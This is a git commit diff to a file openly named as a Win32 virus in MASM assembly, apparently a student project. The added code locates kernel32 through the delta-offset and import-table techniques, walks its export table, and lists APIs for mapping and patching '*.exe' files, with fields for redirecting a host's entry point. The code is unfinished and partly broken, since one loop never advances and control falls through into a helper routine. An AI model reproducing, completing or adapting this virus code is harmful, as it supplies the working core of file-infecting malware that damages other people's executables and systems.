ab9e4c4007e8e52e5a8aa9f8aa39d8be15ac616f
dominhquan <dominhquan.uit@gmail.com>
2014-11-09 18:42:25 +0700

    update

--- Virus/Project Virus/Win32 Virus/Virus.asm
+++ Virus/Project Virus/Win32 Virus/Virus.asm
@@ -28,20 +28,105 @@ count 						db 							0
 .data?
 validPE						dd							?
 hDir 							db 							256 dup (?)
-ErrorCode                                 DWORD                       			?
+ErrorCode                                 DWORD                       			? 
 
 .code
 ; ---------------------------------------------------------------------------
 virusCode:
-	invoke SetCurrentDirectory, addr path
-	call ScanFiles
-	invoke ExitProcess,0
+	pushad
+	pushfd
+	call delta
+delta: 
+	pop ebp
+	mov eax,ebp
+	sub ebp,dword ptr delta
+	mov [ebp+delta_var],ebp
+	;call 
+scan_import:
+	mov esi,[image_base+ebp]			;
+	add eax,3ch						;
+	mov eax,[eax]					;
+	add eax,esi
+	add eax,128
+	mov eax,[eax]
+	add eax,esi
+	add eax,12
+find_kernel32:
+	xor ebx,ebx
+	cmp dword ptr [eax],ebx
+	je end_objecttable
+	call is_it_kernel32
+	cmp ecx,3
+	jae find_kernel32
+	
+find_kernel_image_base:
+	mov eax,[eax+4]
+	add eax,esi
+	mov eax,[eax]
+	xchg edi,eax
+find_MZ_in_kernel:
+	dec edi
+	mov esi,edi
+	cmp word ptr [edi],"MZ"
+	jne find_MZ_in_kernel
+	
+	mov esi,[esi+3CH]
+	cmp esi,dword  ptr 200H
+	ja find_MZ_in_kernel
+	
+	add esi,edi
+	cmp word ptr [esi],"PE"
+	jne find_MZ_in_kernel
+	add esi,52
+	
+	cmp edi,dword ptr [esi]
+	jne find_MZ_in_kernel
+	
+	mov esi,edi
+	add esi,3CH
+	mov esi,[esi]
+	add esi,edi
+	
+	add esi,120
+	mov esi,[esi]
+	add esi,edi				; !!! esi point now to the EXPORT TABLE !!!
+	
+
+
+is_it_kernel32: 
+	xor ecx,ecx
+	mov ebx,dword ptr [eax]
+	add ebx,esi
+	cmp dword ptr[ebx],"Kern"
+	jne az1
+	inc ecx
+az1:	
+	cmp dword ptr[ebx+4],"el32"
+	jne az2
+	inc ecx
+az2:	
+	cmp dword ptr[ebx+16],".DLL"
+	jne az3
+	inc ecx
+az3:	
+	ret
+
+	;invoke SetCurrentDirectory, addr path
+	;call ScanFiles
+	
+	popfd
+	popad
+	
+jump: 
+	db 68h,0,0,0,0	
+	ret
 		
 ScanFiles proc
 	; Declare local varibles
 	LOCAL fileFD  : WIN32_FIND_DATA     
 	LOCAL fileHD  : HANDLE
 	LOCAL subPath : BYTE
+	
 	; Find first file 
 	; @param path (all : *.*)
 	; @param ptr to WIN32_FIND_DATA(fileFD)
@@ -54,19 +139,21 @@ ScanFiles proc
 			mov fileHD,eax
 			.while eax>0
 				lea esi,fileFD.cFileName
-				cmp [esi],byte ptr "."
-				je nextfile
-				cmp [esi],byte ptr ".."
-				je nextfile
-				; check if result is dir
-				.if (fileFD.dwFileAttributes==16)
-					invoke MessageBox,NULL,addr fileFD.cFileName,addr FolderFound,MB_OK
-					invoke SetCurrentDirectory,addr fileFD.cFileName
-					call ScanFiles
-					invoke SetCurrentDirectory, addr backDir 
-				.else
-					invoke MessageBox,NULL,addr fileFD.cFileName,addr FindNextFileSuccess,MB_OK
+				.if fileFD.cFileName != byte ptr "." && fileFD.cFileName != byte ptr ".."
+					;cmp [esi],byte ptr "."
+					;je nextfile
+					;cmp [esi],byte ptr ".."
+					;je nextfile
+					.if (fileFD.dwFileAttributes==16) ; check if result is dir
+						invoke MessageBox,NULL,addr fileFD.cFileName,addr FolderFound,MB_OK
+						invoke SetCurrentDirectory,addr fileFD.cFileName
+						call ScanFiles
+						invoke SetCurrentDirectory, addr backDir 
+					.else
+						invoke MessageBox,NULL,addr fileFD.cFileName,addr FindNextFileSuccess,MB_OK
+					.endif
 				.endif
+				
 			nextfile:
 				invoke FindNextFile, fileHD, addr fileFD
 			.endw	
@@ -81,5 +168,72 @@ CheckFile proc fileName:dword
 	ret
 
 CheckFile endp
+
+OpenFileTest proc 
+	
+	
+	ret
+
+OpenFileTest endp
+
+end_objecttable:
+
+image_base    				dd    0h 
+kernel_string   		      	db    "kernel32.dll", 0 
+search_mask    				db    "*.exe", 0 
+handle       				dd    0h
+GetProc     				dd    0h
+file_handle    				dd    0h
+GetMod       				dd    0h
+delta_var    				dd    0h
+map_handle    				dd    0h
+file_map_handle    			dd    0h
+mem_map_handle    			dd    0h
+host_opt_size    				dw    0h
+host_no_sect    				dw    0h
+host_file_alig   				dd    0h
+host_sec_alig    				dd    0h
+host_relc_raw    				dd    0h
+virtual_out    				dd    0h
+search_handle    				dd    0h
+host_rel_tab    				dd    0h
+host_new_entry    			dd    0h    
+
+Win32Data:
+      FileAttributes           	dd 0              ;attributes
+      CreationTime             	dd 0,0            ;time of creation
+      LastAccessTime           	dd 0,0            ;last access time
+      LastWriteTime            	dd 0,0            ;last modification
+      FileSizeHigh             	dd 0              ;filesize
+      FileSizeLow              	dd 0              ; "
+      Reserved0                	dd 0
+      Reserved1                	dd 0
+      FileName                 	db 260 dup(?)         ;long filename
+      AlternateFileName        	db 13  dup(?)         ;short filename
+
+APIName:
+	FindFirstFileAStr    		db    "FindFirstFileA", 0 
+	FindNextFileAStr    		db    "FindNextFileA", 0 
+	CreateFileAStr        		db    "CreateFileA" , 0
+	CreateFileMappingStr    	db    "CreateFileMappingA", 0 
+	MapViewOfFileStr    		db    "MapViewOfFile", 0 
+	GetProcAddressStr    		db    "GetProcAddress" , 0 
+	GetModuleHandleAStr    		db    "GetModuleHandleA", 0 
+	UnmapViewOfFileStr    		db    "UnmapViewOfFile", 0 
+	CloseHandleStr        		db    "CloseHandle", 0 
+	VirtualProtectStr    		db    "VirtualProtect", 0
+	
+APIAdd:
+	FindNextFileAAdd   	 	dd    0h
+	FindFirstFileAAdd   	 	dd    0h
+	CreateFileAAdd        		dd    0h
+	CreateFileMappingAAdd    	dd    0h
+	MapViewOfFileAAdd   	 	dd    0h
+	GetModuleHandleAAdd  	 	dd    0h
+	GetProcAddressAdd    		dd    0h 
+	UnmapViewOfFileAdd    		dd    0h
+	CloseHandleAdd        		dd    0h
+	VirtualProtectAdd    		dd    0h
+
 
 end virusCode
